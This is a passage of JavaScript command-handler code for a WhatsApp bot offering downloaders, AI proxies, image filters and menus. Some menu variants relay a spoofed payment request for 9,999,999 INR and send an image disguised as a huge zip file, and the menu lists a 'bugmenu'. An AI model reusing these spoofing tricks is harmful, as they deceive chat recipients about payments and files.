          } catch (error) {
            replyLinkGc(`Error: ${error.message}`);
          }
        }
        break;
      case "dalle":
        {
          if (!text)
            return replyLinkGc(
              `*This command generates images from text prompts*\n\n*𝙴xample usage*\n*${
                prefix + command
              } Beautiful anime girl*\n*${prefix + command} girl in pink dress*`
            );
          try {
            replyLinkGc("*Please wait, generating image...*");
            const endpoint = `https://cute-tan-gorilla-yoke.cyclic.app/imagine?text=${encodeURIComponent(
              text
            )}`;
            const response = await fetch(endpoint);
            if (response.ok) {
              const imageBuffer = await response.buffer();
              await OctopusBotzz.sendMessage(
                m.chat,
                { image: imageBuffer },
                { quoted: m }
              );
            } else {
              throw "*Image generation failed*";
            }
          } catch {
            replyLinkGc(
              "*Oops! Something went wrong while generating images. Please try again later.*"
            );
          }
        }
        break;
      case "translate":
        {
          if (!q)
            return replyLinkGc(
              `*Where is the text*\n\n*𝙴xample usage*\n*${
                prefix + command
              } <language id> <text>*\n*${prefix + command} ja yo wassup*`
            );
          const defaultLang = "en";
          const tld = "cn";
          let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim();
          let lang = args[0];
          let text = args.slice(1).join(" ");
          if ((args[0] || "").length !== 2) {
            lang = defaultLang;
            text = args.join(" ");
          }
          if (!text && m.quoted && m.quoted.text) text = m.quoted.text;
          try {
            let result = await translate(text, {
              to: lang,
              autoCorrect: true,
            }).catch((_) => null);
            replyLinkGc(result.text);
          } catch (e) {
            return replyLinkGc(err);
          }
        }
        break;
      case "quran":
        {
          try {
            // Extract the surah number or name from the command text.
            let surahInput = m.text.split(" ")[1];
            if (!surahInput) {
              throw new Error(`Please specify the surah number or name`);
            }
            let surahListRes = await fetch(
              "https://quran-endpoint.vercel.app/quran"
            );
            let surahList = await surahListRes.json();
            let surahData = surahList.data.find(
              (surah) =>
                surah.number === Number(surahInput) ||
                surah.asma.ar.short.toLowerCase() ===
                  surahInput.toLowerCase() ||
                surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
            );
            if (!surahData) {
              throw new Error(
                `Couldn't find surah with number or name "${surahInput}"`
              );
            }
            let res = await fetch(
              `https://quran-endpoint.vercel.app/quran/${surahData.number}`
            );
            if (!res.ok) {
              let error = await res.json();
              throw new Error(
                `API request failed with status ${res.status} and message ${error.message}`
              );
            }

            let json = await res.json();

            // Translate tafsir from Bahasa Indonesia to Urdu
            let translatedTafsirUrdu = await translate(json.data.tafsir.id, {
              to: "ur",
              autoCorrect: true,
            });

            // Translate tafsir from Bahasa Indonesia to English
            let translatedTafsirEnglish = await translate(json.data.tafsir.id, {
              to: "en",
              autoCorrect: true,
            });

            let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`;

            replyLinkGc(quranSurah);

            if (json.data.recitation.full) {
              OctopusBotzz.sendMessage(
                m.chat,
                {
                  audio: { url: json.data.recitation.full },
                  mimetype: "audio/mp4",
                  ptt: true,
                  fileName: `recitation.mp3`,
                },
                { quoted: m }
              );
            }
          } catch (error) {
            replyLinkGc(`Error: ${error.message}`);
          }
        }
        break;
      case "mediafire":
        {
          if (!args[0])
            return replyLinkGc(`Enter the mediafire link next to the command`);
          if (!args[0].match(/mediafire/gi))
            return replyLinkGc(`Link incorrect`);
          const { mediafiredl } = require("@bochilteam/scraper");
          let full = /f$/i.test(command);
          let u = /https?:\/\//.test(args[0]) ? args[0] : "https://" + args[0];
          let res = await mediafiredl(args[0]);
          let { url, url2, filename, ext, aploud, filesize, filesizeH } = res;
          let caption = `
   ≡ *MEDIAFIRE*

▢ *Number:* ${filename}
▢ *Size:* ${filesizeH}
▢ *Extension:* ${ext}
▢ *Uploaded:* ${aploud}
`.trim();
          OctopusBotzz.sendMessage(
            m.chat,
            {
              document: { url: url },
              fileName: filename,
              mimetype: ext,
            },
            { quoted: m }
          );
        }
        break;
      case "tagadmin":
      case "listadmin":
      case "admin":
        {
          if (!m.isGroup) return XeonStickGroup();
          const groupAdmins = participants.filter((p) => p.admin);
          const listAdmin = groupAdmins
            .map((v, i) => `${i + 1}. @${v.id.split("@")[0]}`)
            .join("\n");
          const owner =
            groupMetadata.owner ||
            groupAdmins.find((p) => p.admin === "superadmin")?.id ||
            m.chat.split`-`[0] + "@s.whatsapp.net";
          let text = `   
*Group Admins:*
${listAdmin}
`.trim();
          OctopusBotzz.sendMessage(
            m.chat,
            {
              text: text,
              mentions: [...groupAdmins.map((v) => v.id), owner],
            },
            { quoted: m }
          );
        }
        break;
      case "instagram":
      case "igvideo":
      case "igimage":
      case "igvid":
      case "igimg":
        {
          if (!text)
            return replyLinkGc(
              `You need to give the URL of Any Instagram video, post, reel, image`
            );
          let res;
          try {
            res = await fetch(
              `https://www.guruapi.tech/api/igdlv1?url=${text}`
            );
          } catch (error) {
            return replyLinkGc(`An error occurred: ${error.message}`);
          }
          let api_response = await res.json();
          if (!api_response || !api_response.data) {
            return replyLinkGc(
              `No video or image found or Invalid response from API.`
            );
          }
          const mediaArray = api_response.data;
          for (const mediaData of mediaArray) {
            const mediaType = mediaData.type;
            const mediaURL = mediaData.url_download;
            let cap = `HERE IS THE ${mediaType.toUpperCase()}`;
            if (mediaType === "video") {
              OctopusBotzz.sendMessage(
                m.chat,
                { video: { url: mediaURL }, caption: cap },
                { quoted: m }
              );
            } else if (mediaType === "image") {
              OctopusBotzz.sendMessage(
                m.chat,
                { image: { url: mediaURL }, caption: cap },
                { quoted: m }
              );
            }
          }
        }
        break;
      case "apk":
      case "apkdl":
        {
          if (!text) return replyLinkGc("What apk u wanna download?");
          let resxeon = await fetch(
            `https://vihangayt.me/download/apk?id=${text}`
          );
          let jsonxeon = await resxeon.json();
          OctopusBotzz.sendMessage(
            from,
            {
              document: { url: jsonxeon.data.dllink },
              fileName: jsonxeon.data.name,
              mimetype: "application/vnd.android.package-archive",
            },
            { quoted: m }
          ).catch(console.error);
        }
        break;
      case "mathsai":
        {
          if (!text) return replyLinkGc("What is your question?");
          let d = await fetchJson(
            `https://vihangayt.me/tools/mathssolve?q=${text}`
          );
          replyLinkGc(d.data);
        }
        break;
      case "blackboxai":
        {
          if (!text) return replyLinkGc("What is your question?");
          let d = await fetchJson(
            `https://vihangayt.me/tools/blackboxv4?q=${text}`
          );
          replyLinkGc(d.data);
        }
        break;
      case "bardai":
        {
          if (!text) return replyLinkGc("What is your question?");
          let d = await fetchJson(`https://vihangayt.me/tools/bard?q=${text}`);
          replyLinkGc(d.data);
        }
        break;
      case "photoleapai":
        {
          if (!text) return replyLinkGc("What is your question?");
          let xeonfetch = await fetchJson(
            `https://vihangayt.me/tools/photoleap?q=${text}`
          );
          OctopusBotzz.sendMessage(
            from,
            { image: { url: xeonfetch.data } },
            { quoted: m }
          );
        }
        break;
      case "lamaai":
        {
          if (!text) return replyLinkGc("What is your question?");
          let d = await fetchJson(
            `https://vihangayt.me/tools/llama-2?q=${text}`
          );
          replyLinkGc(d.data);
        }
        break;
      case "geminiai":
        {
          if (!text) return replyLinkGc("What is your question?");
          let d = await fetchJson(
            `https://vihangayt.me/tools/gemini?q=${text}`
          );
          replyLinkGc(d.data);
        }
        break;
      case "itunes":
        {
          if (!text) return replyLinkGc("Please provide a song name");
          try {
            let res = await fetch(
              `https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`
            );
            if (!res.ok) {
              throw new Error(`API request failed with status ${res.status}`);
            }
            let json = await res.json();
            console.log("JSON response:", json);
            let songInfo = `*Song Information:*\n
     • *Name:* ${json.name}\n
     • *Artist:* ${json.artist}\n
     • *Album:* ${json.album}\n
     • *Release Date:* ${json.release_date}\n
     • *Price:* ${json.price}\n
     • *Length:* ${json.length}\n
     • *Genre:* ${json.genre}\n
     • *URL:* ${json.url}`;
            // Check if thumbnail is present, then send it with songInfo as caption
            if (json.thumbnail) {
              await OctopusBotzz.sendMessage(
                m.chat,
                {
                  image: { url: json.thumbnail },
                  caption: songInfo,
                },
                { quoted: m }
              );
            } else {
              replyLinkGc(songInfo);
            }
          } catch (error) {
            console.error(error);
            // Handle the error appropriately
          }
        }
        break;
      case "ttp":
        if (args.length == 0)
          return reply(`Example: ${prefix + command} dgxeon`);
        dgxeontks = args.join(" ");
        dgxeonvuff = await getBuffer(
          `https://vihangayt.me/maker/text2img?q=${dgxeontks}`
        );
        OctopusBotzz.sendImageAsSticker(m.chat, dgxeonvuff, m, {
          packname: packname,
          author: author,
        });
        break;
      case "attp":
        if (args.length == 0)
          return reply(`Example: ${prefix + command} dgxeon`);
        dgxeontks2 = args.join(" ");
        dgxeonvuff2 = await getBuffer(
          `https://vihangayt.me/maker/text2gif?q=${dgxeontks2}`
        );
        OctopusBotzz.sendImageAsSticker(m.chat, dgxeonvuff2, m, {
          packname: packname,
          author: author,
        });
        break;
      case "blur":
      case "blurimg":
        {
          if (!isMedia) return replyLinkGc("Where Is The Image");
          let media = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          OctopusBotzz.sendMessage(
            m.chat,
            {
              image: {
                url: `https://vihangayt.me/maker/blur?url=${anu}`,
              },
              caption: "Here you go!",
            },
            { quoted: m }
          );
        }
        break;
      case "beautiful":
      case "beautifulimg":
        {
          if (!isMedia) return replyLinkGc("Where Is The Image");
          let media = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          OctopusBotzz.sendMessage(
            m.chat,
            {
              image: {
                url: `https://vihangayt.me/maker/beautiful?url=${anu}`,
              },
              caption: "Here you go!",
            },
            { quoted: m }
          );
        }
        break;
      case "facepalm":
      case "facepalmimage":
        {
          if (!isMedia) return replyLinkGc("Where Is The Image");
          let media = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          OctopusBotzz.sendMessage(
            m.chat,
            {
              image: {
                url: `https://vihangayt.me/maker/facepalm?url=${anu}`,
              },
              caption: "Here you go!",
            },
            { quoted: m }
          );
        }
        break;
      case "invert":
      case "invertimage":
        {
          if (!isMedia) return replyLinkGc("Where Is The Image");
          let media = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          OctopusBotzz.sendMessage(
            m.chat,
            {
              image: {
                url: `https://vihangayt.me/maker/invert?url=${anu}`,
              },
              caption: "Here you go!",
            },
            { quoted: m }
          );
        }
        break;
      case "pixelate":
      case "pixelateimage":
        {
          if (!isMedia) return replyLinkGc("Where Is The Image");
          let media = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          OctopusBotzz.sendMessage(
            m.chat,
            {
              image: {
                url: `https://vihangayt.me/maker/pixelate?url=${anu}`,
              },
              caption: "Here you go!",
            },
            { quoted: m }
          );
        }
        break;
      case "rainbow":
      case "rainbowimage":
        {
          if (!isMedia) return replyLinkGc("Where Is The Image");
          let media = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          OctopusBotzz.sendMessage(
            m.chat,
            {
              image: {
                url: `https://vihangayt.me/maker/rainbow?url=${anu}`,
              },
              caption: "Here you go!",
            },
            { quoted: m }
          );
        }
        break;
      case "trigger":
      case "triggerimage":
        {
          if (!isMedia) return replyLinkGc("Where Is The Image");
          let media = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          OctopusBotzz.sendMessage(
            m.chat,
            {
              image: {
                url: `https://vihangayt.me/maker/trigger?url=${anu}`,
              },
              caption: "Here you go!",
            },
            { quoted: m }
          );
        }
        break;
      case "wanted":
      case "wantedimage":
        {
          if (!isMedia) return replyLinkGc("Where Is The Image");
          let media = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          OctopusBotzz.sendMessage(
            m.chat,
            {
              image: {
                url: `https://vihangayt.me/maker/wanted?url=${anu}`,
              },
              caption: "Here you go!",
            },
            { quoted: m }
          );
        }
        break;
      case "wasted":
      case "wastedimage":
        {
          if (!isMedia) return replyLinkGc("Where Is The Image");
          let media = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          OctopusBotzz.sendMessage(
            m.chat,
            {
              image: {
                url: `https://vihangayt.me/maker/wasted?url=${anu}`,
              },
              caption: "Here you go!",
            },
            { quoted: m }
          );
        }
        break;
      case "carbon":
      case "carbonimage":
        {
          if (!text) return replyLinkGc("Where is the text?");
          OctopusBotzz.sendMessage(
            m.chat,
            {
              image: {
                url: `https://vihangayt.me/maker/carbonimg?q=${text}`,
              },
              caption: "Here you go!",
            },
            { quoted: m }
          );
        }
        break;
      case "colorize":
        {
          if (!isMedia) return replyLinkGc("Where Is The Image");
          let media = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          OctopusBotzz.sendMessage(
            m.chat,
            {
              image: {
                url: `https://vihangayt.me/tools/colorize?url=${anu}`,
              },
              caption: "Here you go!",
            },
            { quoted: m }
          );
        }
        break;
      case "enhance":
        {
          if (!isMedia) return replyLinkGc("Where Is The Image");
          let media = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          OctopusBotzz.sendMessage(
            m.chat,
            {
              image: {
                url: `https://vihangayt.me/tools/enhance?url=${anu}`,
              },
              caption: "Here you go!",
            },
            { quoted: m }
          );
        }
        break;
      case "dehaze":
        {
          if (!isMedia) return replyLinkGc("Where Is The Image");
          let media = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          OctopusBotzz.sendMessage(
            m.chat,
            {
              image: {
                url: `https://vihangayt.me/tools/dehaze?url=${anu}`,
              },
              caption: "Here you go!",
            },
            { quoted: m }
          );
        }
        break;

      // short Link
      case "bitly":
        {
          reply(mess.wait);
          Bitly(teks);
        }
        break;

      case "totalfeature":
      case "totalfitur":
      case "totalcmd":
      case "totalcase":
      case "totalcommand":
        replyLinkGc(`Total Features of ${botname} is ${totalcase()}`);
        break;
      case "menu":
      case "oct":
      case "octopus":
      case "help":
      case "list":
      case "panel":
      case "bot":
        {
          //random audio
          const musiknya = [
            "audio1",
            "audio2",
            "audio3",
            "audio4",
            "audio5",
            "audio6",
            "audio7",
            "audio8",
            "audio9",
          ];
          const acak = musiknya[Math.floor(Math.random() * musiknya.length)];
          //filemp3 = fs.readFileSync(`./OctopusBotzzMedia/random_audio/${acak}.mp3`) //for internal directory file
          fileonlinemp3 = await getBuffer(
            `https://github.com/sulaiman0851/database-json-script-bot-WhatApp/blob/main/audio/${acak}.mp3?raw=true`
          ); //online API directory file
          OctopusBotzz.sendMessage(
            from,
            {
              audio: fileonlinemp3,
              mimetype: "audio/mp4",
              ptt: true,
            },
            { quoted: m }
          );
          let ownernya = ownernumber + "@s.whatsapp.net";
          let timestampe = speed();
          let latensie = speed() - timestampe;
          let a = db.data.users[sender];
          let me = m.sender;
          let b = `│Your Limit: ${a.limit}\n`;
          b += `│Premium Status: ${
            isPremium ? "Premium✅️" : "Tidak Premium❌️"
          }\n`;
          let msg = `┌─❖
│ Hai ${pushname} 👋
│ Uapan: ${ucapanWaktu}
└───────────────┈ ⳹
│
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊 
│𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
│𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
│𝗕𝗼𝘁 : ${botname}
│𝗢𝘄𝗻𝗲𝗿 𝗡𝗼: +${ownernumber}
│𝗣𝗿𝗲𝗳𝗶𝘅 :  [ ${xprefix} ]
│𝗠𝗼𝗱𝗲 : ${OctopusBotzz.public ? "Public" : `Self`}
│𝗛𝗼𝘀𝘁 𝗡𝗮𝗺𝗲 : ${os.hostname()}
│𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
│𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿 : ${Object.keys(global.db.data.users).length} User
│𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁 : ${global.db.data.settings[botNumber].totalhit} Hit
│𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗮𝘁 : ${Object.keys(global.db.data.chats).length} Chat/Gc
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊
│𝗡𝗮𝗺𝗲 : ${pushname}
│𝗡𝘂𝗺𝗯𝗲𝗿 : +${me.split("@")[0]}
│𝗟𝗶𝗺𝗶𝘁 : ${a.limit}
│𝗧𝗶𝘁𝗹𝗲 : ${a.title ? a.title : "-"}
│𝗦𝗲𝗿𝗶𝗮𝗹: ${a.serialNumber}
${b}
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝗧𝗶𝗺𝗲 : ${xtime}
│𝗗𝗮𝘁𝗲 : ${xdate}
└┬───────────────── ⳹
   │✑  Please Type The *MENU*
   │✑  Given *BELOW*
┌└─────────────┈ ⳹
│❏${xprefix}allmenu
│❏${xprefix}downloadmenu
│❏${xprefix}funmenu
│❏${xprefix}aimenu
│❏${xprefix}groupmenu
│❏${xprefix}ownermenu
│❏${xprefix}photooxymenu
│❏${xprefix}ephoto360menu
│❏${xprefix}makermenu
│❏${xprefix}animemenu
│❏${xprefix}randomphotomenu
│❏${xprefix}randomvideomenu
│❏${xprefix}stickermenu
│❏${xprefix}databasemenu
│❏${xprefix}stalkermenu
│❏${xprefix}bugmenu
│❏${xprefix}othermenu
└─────────────────┈ ⳹`;
          if (typemenu === "v1") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: msg,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: msg,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: msg,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: msg,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                gifPlayback: true,
                caption: msg,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "checkaccount":
      case "infoaccount":
      case "infoakun":
      case "account":
      case "akun":
      case "info":
      case "inpo":
        {
          let a = db.data.users[sender];
          let b = `Di bawah ini adalah informasi akun Anda\n`;
          b += `================================\n`;
          b += `Serial Code:\n*[${a.serialNumber}]*\n`;
          b += `Title: ${a.title}\n`;
          b += `Afk Time: ${a.afkTime}\n`;
          b += `Afk Reason: ${a.afkReason}\n`;
          b += `Nickname: ${a.nick}\n`;
          b += `Premium Status: ${
            isPremium ? "Premium✅️" : "Tidak Premium❌️"
          }\n`;
          b += `Your Limit: ${a.limit}\n`;
          b += `================================`;
          if (m.isGroup) {
            replyLinkGc("Detail Akun Telah Dikirim Dalam Obrolan Pribadi");
            OctopusBotzz.sendMessage(sender, { text: b }, { quoted: m });
          } else {
            m.reply(b);
          }
        }
        break;
      case "limit":
      case "checklimit":
        {
          let a = db.data.users[sender];
          let b = `Your Limit ${a.limit}\n`;
          b += `Premium Status ${
            isPremium ? "Premium✅️" : "Tidak Premium❌️"
          }\n`;
          replyLinkGc(b);
        }
        break;
      case "allmenu":
        {
          let msg = `Hi ${pushname}\n\n${allmenu(prefix)}`;
          if (typemenu === "v1") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: msg,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: msg,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: msg,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: msg,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                gifPlayback: true,
                caption: msg,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "ownermenu":
        {
          let msg = `Hi ${pushname}\n\n${ownermenu(prefix)}`;
          if (typemenu === "v1") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: msg,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: msg,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: msg,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: msg,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                gifPlayback: true,
                caption: msg,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "othermenu":
        {
          let msg = `Hi ${pushname}\n\n${othermenu(prefix)}`;
          if (typemenu === "v1") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: msg,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: msg,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: msg,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: msg,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
